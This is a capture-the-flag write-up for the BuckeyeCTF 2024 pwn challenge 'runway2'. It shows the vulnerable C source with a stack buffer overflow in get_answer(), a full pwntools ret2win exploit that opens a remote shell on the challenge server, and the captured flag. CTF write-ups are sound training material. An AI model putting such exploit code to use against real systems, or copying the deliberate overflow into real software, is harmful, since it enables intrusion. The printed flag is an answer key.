# runway2 [171 solves]
### Challenge Description
> Now with a twist!

`nc challs.pwnoh.io 13402`
### Challenge Author 
> Author: kanderoo
# Challenge Files 
we are given with the source file that was used for compiling the binary.
```c filename=runway2.c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <fcntl.h>
#include <sys/sendfile.h>

int win(int check, int mate) {
    if (check == 0xc0ffee && mate == 0x007ab1e) {
        printf("You win! Here is your shell:\n");
        fflush(stdout);

        system("/bin/sh");
    } else {
        printf("No way!");
        fflush(stdout);
    }
}

int get_answer() {
    char answer[16];

    fgets(answer, 0x40, stdin);

    return strtol(answer, NULL, 10);
}

int calculate_answer(int op1, int op2, int op) {
    switch (op)
    {
        case 0:
            return (op1 + op2);
        case 1:
            return (op1 - op2);
        case 2:
            return (op1 * op2);
        case 3:
            return (op1 / op2);
        default:
            exit(-1);
    }
}

int main() {
    int op1;
    int op2;
    int op;
    char operands[5] = "+-*/";
    int input;
    int answer;

    srand(time(0));

    printf("Pop quiz!\n");
    fflush(stdout);

    op1 = rand() % 30;
    op2 = rand() % 30;
    op = rand() % 4;

    printf("What is %d %c %d?\n", op1, op[operands], op2);
    fflush(stdout);

    input = get_answer();
    answer = calculate_answer(op1, op2, op);

    if (input == answer) {
        printf("Good job! No flag though :)\n");
    } else {
        printf("I don't think you're trying very hard.\n");
    }

    return 0;
}
```
# Solution
## Analysis
first analyse the provided binary
```bash
fooker@fooker:~/buckeyectf2024/pwn/runway2$ file runway2
runway2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=7dd57df77d8de995c3d60fcd8c80ca0d4a1db483, for GNU/Linux 3.2.0, not stripped
fooker@fooker:~/buckeyectf2024/pwn/runway2$ checksec runway2
[*] '~/buckeyectf2024/pwn/runway2/runway2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
so we are dealing again with a `32-bit ELF`. a quick scan reveals that we have a `win()` function and a buffer overflow in `get_answer()`.
## ret2win
to pop a shell, we need to however pass the correct parameters to the `win()` function
```c
int win(int check, int mate) {
    if (check == 0xc0ffee && mate == 0x007ab1e) {
        printf("You win! Here is your shell:\n");
        fflush(stdout);

        system("/bin/sh");
    } else {
        printf("No way!");
        fflush(stdout);
    }
}
```
since we are dealing with a `32-bit` binary, we must push the parameters onto the stack according to the `x86 calling convention`. this is good for us since we control the stack through the buffer overflow. 

i calculated the offsets at which the required parameters must be passed using `gdb`. then we just need to craft a `ret2win` ROP chain to get a shell. here's the full exploit.

```py
from pwn import *

exe = './runway2'
elf = context.binary = ELF(exe, checksec=True)

host = 'challs.pwnoh.io'
port = 13402
r = remote(host, port, level='DEBUG')

gs = '''
break *get_answer
continue
'''

# r = gdb.debug(exe, gdbscript=gs)

r.recvuntil(b'?\n')

payload = b'A' * (0x18 + 0x04)
payload += p32(elf.symbols['win'])
payload += b'A' * 0x04
payload += p32(0xc0ffee)
payload += p32(0x7ab1e)

r.sendline(payload)

r.interactive()
```
and if we run this exploit, we get a shell.
```bash
fooker@fooker:~/buckeyectf2024/pwn/runway2$ python3 exploit.py
[*] '~/buckeyectf2024/pwn/runway2/runway2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to challs.pwnoh.io on port 13402: Done
[*] Switching to interactive mode
You win! Here is your shell:
$ ls
flag.txt
run
$ cat flag.txt
bctf{I_m1sS_4r1thm3t1c_qu1ZZ3s_2349adb53baa2955}$
```
## Flag
`bctf{I_m1sS_4r1thm3t1c_qu1ZZ3s_2349adb53baa2955}`
